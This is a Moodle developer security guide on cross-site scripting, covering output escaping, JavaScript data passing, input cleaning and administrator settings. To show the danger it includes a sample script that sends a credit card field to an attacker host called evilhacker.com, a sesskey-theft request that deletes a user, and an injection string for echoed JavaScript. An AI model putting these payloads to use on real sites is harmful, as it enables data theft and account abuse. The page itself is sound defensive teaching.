---
title: Cross-site scripting
sidebar_position: 4
tags:
  - Coding guidelines
  - Policies
  - Security
---

:::note

This page forms part of the [Moodle security guidelines](../security).

:::

## What is the danger?

Normally, web browsers prevent JavaScript from the server from affecting content that comes from another server. For example, suppose that on your Moodle page (`http://mymooodle.com`), you have an iframe displaying an advert from `http://makemerich.com`. Then, the JavaScript code in the advert cannot access anything on your page.

In Moodle, we actually let users type in HTML, then we display that HTML as part of our web site. Therefore, any JavaScript they manage to include will have full access to everything on the page.

Why is that a problem? Well, suppose Evil Hacker manages to get some code like

```javascript
document.write('<img width="1" height="1" ' +
     'src="http://evilhacker.com/savedata.php?creditcard=' +
     document.getElementById('creditcard').value + '" />');
```

on a page where the user types in their credit card number. Actually, that scenario is quite unlikely in Moodle, but there are more plausible scenarios that are possible.

Another problem is that XSS makes it much easier for Evil Hacker get round sesskey protection. For example:

```javascript
document.write('<img width="1" height="1" ' +
     'src="http://example.com/moodle/user/delete.php?id=123&confirm=1&sesskey=' +
     document.getElementById('sesskey').value + '" />');
```

Or even more sophisticated, the JavaScript to do that as a POST request, in a forum where an Administrator would go, would be very bad.

Note that, at least in Internet Explorer, JavaScript can be hidden in CSS style information, as well as in the HTML. Java applets can also be used to execute scripting, as well as the browser's JavaScript engine.

Note also that dangerous content may not only be input into Moodle directly by a user. It may also come, for example, from an external RSS feed.

## How Moodle avoids this problem

The simplest solution to XSS attacks is to **never let the user input rich content** like HTML or upload plugins like Java applets. Unfortunately, with Moodle we want to let our users communicate using rich content. For example, we want students to be able to express themselves by making forum posts in flashing orange text. We want teacher to be able to upload interesting applets for use by their students. Therefore, we have to compromise.

### Escaping output

Moodle divides content that has been input by the user into four categories:

1. **Plain text content**. For example, a student's response to a short answer question.
2. **Labels that are plain text**, except that they main contain multi-lang spans. For example, a course name or section heading.
3. **HTML (or wiki, markdown) content**, that might have been input by anyone. For example, the body of a forum post.
4. **HTML (or wiki, markdown) content**, that could only have been input by a **trusted user**, like a teacher. For example, the body of a web page resource.

Depending on the type of content, you need to use the appropriate function to output it. For example, if you have plain text content, you should use the `s()` function to output it. That will replace any `<` character with `&lt;`. If that is done, there is no way that the input can be interpreted as JavaScript.

### Escaping output 2 - JavaScript

The other place you need to be careful is when you are sending data to JavaScript. For example, if you generate JavaScript in your PHP code like

```php
echo '<script type="text/javascript">';
echo 'alert("' . $userinput . '");';
echo '</script>';
```

and Evil hacker can make `$userinput` equal to something like:

```php
); /* Do something evil. */ (
```

then they can get whatever code they choose to put in the `/* Do something evil. */` space to run within your web page.

The best solution is to not echo JavaScript like this. Instead, follow the [JavaScript guidelines](/docs/guides/javascript), and put your JavaScript in an external file, and communicate with it using `$PAGE->requires->data_for_js` or `$PAGE->requires->js_function_call`. Those two methods properly encode any PHP data to be passed to JavaScript using `json_encode`.

### Cleaning input

The other part of the protection is cleaning up data as it comes in. This is done using the `optional_param` or `required_param` functions. For example, if you say you are expecting an integer as input, by passing `PARAM_INT`, then you will only get an integer back. Once you know that a variable only contains an integer value, you can be sure it does not contain any malicious JavaScript.

However, for very complex input, like HTML, doing the cleaning is very tricky, and the code is likely to handle some complex situations badly. The algorithms will almost certainly be improved in the future, so for complex content, we store the raw input in the database, and only do the cleaning when it is output, using the latest algorithms.

## What you need to do in your code

- Get input values using `optional_param` or `required_param` with an appropriate `PARAM_*` type, to ensure that only data of the type you expect is accepted.
- Alternatively, use a [moodleforms](https://docs.moodle.org/dev/lib/formslib.php), with appropriate `->setType` calls in the form definition.
- Clean or escape content appropriately on output.
  - Use `s()` or `p()` to output plain text content (type 1 above).
  - Use `format_string` to output content with minimal HTML like multi-lang spans (type 2 above).
  - Use `format_text` to output all other content (types 3 and 4 above). How carefully it is cleaned (that is, the difference between type 3 and 4) depends on the `$options->noclean` argument to `format_text`.
- Any place where a use can input content that is output by `format_text`, `$options->noclean`, must be protected by a capability check, and the capability must be marked as `RISK_XSS`.
- When sending data to JavaScript code:
  - Use the `$PAGE->requires->data_for_js` or `$PAGE->requires->js_function_call` methods.
  - In Moodle 1.9 and earlier, escape the data with `addslashes_js` before printing it into the JavaScript code.

:::info

Follow the [Output functions](https://docs.moodle.org/dev/Output_functions) link to get a best understanding of how dynamic data should be sent from Moodle to the browser.

:::

## What you need to do as an administrator

- Do not allow a user to have a capability with `RISK_XSS` unless you trust them.
  - The [Security overview](https://docs.moodle.org//en/Security_overview) report can help you check this.
- From Moodle 3.5 onwards, you can enable setting **Content cleaning everywhere**(`$CFG->forceclean`).

## See also

- [Security](../security)
- [Coding](/general/development/policies)
